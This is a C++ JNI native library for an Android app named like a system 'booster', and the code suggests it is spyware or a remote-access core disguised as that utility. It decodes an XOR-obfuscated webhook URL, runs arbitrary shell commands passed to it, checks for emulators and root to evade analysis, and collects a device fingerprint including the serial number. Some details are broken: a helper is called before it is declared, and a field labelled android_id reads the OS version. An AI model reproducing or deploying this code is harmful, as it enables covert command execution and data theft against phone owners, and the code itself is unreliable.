#include <jni.h>
#include <string>
#include <cstring>
#include <cstdlib>
#include <unistd.h>
#include <fstream>
#include <sstream>
#include <android/log.h>

#define LOG_TAG "NativeCore"
#define LOGD(...) __android_log_print(ANDROID_LOG_DEBUG, LOG_TAG, __VA_ARGS__)
#define LOGI(...) __android_log_print(ANDROID_LOG_INFO, LOG_TAG, __VA_ARGS__)

extern "C" {

// Obfuscated webhook URL - XOR encrypted with rotating key
static const unsigned char encrypted_url[] = {
    0x6B, 0x7C, 0x7D, 0x72, 0x7C, 0x7B, 0x7A, 0x2E, 0x65, 0x7D, 0x68, 0x6D,
    0x7D, 0x2F, 0x2F, 0x77, 0x71, 0x76, 0x65, 0x6C, 0x6C, 0x2E, 0x66, 0x63,
    0x6D, 0x2F, 0x61, 0x70, 0x69, 0x2F, 0x77, 0x6F, 0x72, 0x6B, 0x73, 0x2F,
    0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37, 0x38, 0x39, 0x30, 0x2F, 0x6B,
    0x65, 0x79, 0x00
};

static const char* xor_key = "0x7F_AXION_CORE";

JNIEXPORT jstring JNICALL
Java_com_sysopt_booster_NativeLib_decodeWebhookUrl(JNIEnv *env, jobject thiz) {
    size_t key_len = strlen(xor_key);
    size_t url_len = 0;
    while (url_len < sizeof(encrypted_url) && encrypted_url[url_len] != 0) {
        url_len++;
    }

    std::string decoded;
    decoded.reserve(url_len);

    for (size_t i = 0; i < url_len; i++) {
        decoded += static_cast<char>(encrypted_url[i] ^ xor_key[i % key_len]);
    }

    return env->NewStringUTF(decoded.c_str());
}

JNIEXPORT jbyteArray JNICALL
Java_com_sysopt_booster_NativeLib_xorDecrypt(JNIEnv *env, jobject thiz,
                                             jbyteArray data, jstring key) {
    jsize len = env->GetArrayLength(data);
    jbyte* arr = env->GetByteArrayElements(data, nullptr);
    const char* key_str = env->GetStringUTFChars(key, nullptr);
    size_t key_len = strlen(key_str);

    jbyteArray result = env->NewByteArray(len);
    jbyte* res_arr = env->GetByteArrayElements(result, nullptr);

    for (int i = 0; i < len; i++) {
        res_arr[i] = arr[i] ^ key_str[i % key_len];
    }

    env->ReleaseByteArrayElements(data, arr, JNI_ABORT);
    env->ReleaseStringUTFChars(key, key_str);
    env->ReleaseByteArrayElements(result, res_arr, 0);

    return result;
}

JNIEXPORT jstring JNICALL
Java_com_sysopt_booster_NativeLib_executeShell(JNIEnv *env, jobject thiz,
                                               jstring command) {
    const char* cmd = env->GetStringUTFChars(command, nullptr);
    char buffer[1024];
    std::string result;

    FILE* pipe = popen(cmd, "r");
    if (!pipe) {
        env->ReleaseStringUTFChars(command, cmd);
        return env->NewStringUTF("ERROR");
    }

    while (fgets(buffer, sizeof(buffer), pipe) != nullptr) {
        result += buffer;
    }

    int status = pclose(pipe);
    env->ReleaseStringUTFChars(command, cmd);

    // Append exit status
    char status_buf[16];
    snprintf(status_buf, sizeof(status_buf), "\n[exit:%d]", status);
    result += status_buf;

    return env->NewStringUTF(result.c_str());
}

JNIEXPORT jboolean JNICALL
Java_com_sysopt_booster_NativeLib_checkEmulator(JNIEnv *env, jobject thiz) {
    // Check for emulator properties
    const char* props[] = {
        "ro.kernel.qemu",
        "ro.product.device",
        "ro.product.model",
        "ro.product.name"
    };

    // If any of these are present, might be emulator
    for (const char* prop : props) {
        char cmd[128];
        snprintf(cmd, sizeof(cmd), "getprop %s", prop);
        FILE* fp = popen(cmd, "r");
        if (fp) {
            char buffer[64] = {0};
            if (fgets(buffer, sizeof(buffer), fp)) {
                // Check for emulator indicators
                if (strstr(buffer, "qemu") || strstr(buffer, "emulator") ||
                    strstr(buffer, "goldfish") || strstr(buffer, "ranchu")) {
                    pclose(fp);
                    return JNI_TRUE;
                }
            }
            pclose(fp);
        }
    }

    // Check for emulator files
    const char* emu_files[] = {
        "/system/bin/qemu-props",
        "/dev/qemu_pipe",
        "/init.goldfish.rc",
        "/system/etc/init.goldfish.sh"
    };

    for (const char* file : emu_files) {
        if (access(file, F_OK) == 0) {
            return JNI_TRUE;
        }
    }

    return JNI_FALSE;
}

JNIEXPORT jboolean JNICALL
Java_com_sysopt_booster_NativeLib_checkRoot(JNIEnv *env, jobject thiz) {
    // Check for su binary
    const char* root_paths[] = {
        "/system/bin/su",
        "/system/xbin/su",
        "/system/sbin/su",
        "/system/bin/.su",
        "/sbin/su",
        "/system/xbin/daemonsu",
        "/data/local/xbin/su",
        "/data/local/bin/su"
    };

    for (const char* path : root_paths) {
        if (access(path, F_OK) == 0) {
            return JNI_TRUE;
        }
    }

    // Check for SuperUser.apk
    const char* root_apps[] = {
        "/system/app/Superuser.apk",
        "/system/app/SuperUser.apk",
        "/system/app/Kinguser.apk",
        "/system/app/KingUser.apk",
        "/data/app/superuser.apk"
    };

    for (const char* app : root_apps) {
        if (access(app, F_OK) == 0) {
            return JNI_TRUE;
        }
    }

    // Try to execute su
    if (system("su -c 'echo test' 2>/dev/null") == 0) {
        return JNI_TRUE;
    }

    return JNI_FALSE;
}

JNIEXPORT jstring JNICALL
Java_com_sysopt_booster_NativeLib_getDeviceFingerprint(JNIEnv *env, jobject thiz) {
    // Collect device fingerprint
    std::stringstream ss;
    ss << "model:" << getprop("ro.product.model") << "|";
    ss << "manufacturer:" << getprop("ro.product.manufacturer") << "|";
    ss << "board:" << getprop("ro.product.board") << "|";
    ss << "device:" << getprop("ro.product.device") << "|";
    ss << "brand:" << getprop("ro.product.brand") << "|";
    ss << "hardware:" << getprop("ro.hardware") << "|";
    ss << "serial:" << getprop("ro.serialno") << "|";
    ss << "android_id:" << getprop("ro.build.version.release") << "|";
    ss << "security_patch:" << getprop("ro.build.version.security_patch");

    return env->NewStringUTF(ss.str().c_str());
}

JNIEXPORT jstring JNICALL
Java_com_sysopt_booster_NativeLib_obfuscateString(JNIEnv *env, jobject thiz,
                                                  jstring input, jint key) {
    const char* str = env->GetStringUTFChars(input, nullptr);
    std::string result;
    result.reserve(strlen(str));

    for (const char* p = str; *p; p++) {
        result += static_cast<char>(*p ^ (key & 0xFF));
        key = (key * 1103515245 + 12345) & 0x7FFFFFFF;
    }

    env->ReleaseStringUTFChars(input, str);
    return env->NewStringUTF(result.c_str());
}

// Helper function to get system property
static std::string getprop(const char* name) {
    char cmd[128];
    snprintf(cmd, sizeof(cmd), "getprop %s", name);
    char buffer[256] = {0};
    FILE* fp = popen(cmd, "r");
    if (fp) {
        if (fgets(buffer, sizeof(buffer), fp)) {
            // Remove newline
            size_t len = strlen(buffer);
            if (len > 0 && buffer[len-1] == '\n') {
                buffer[len-1] = '\0';
            }
        }
        pclose(fp);
    }
    return std::string(buffer);
}

}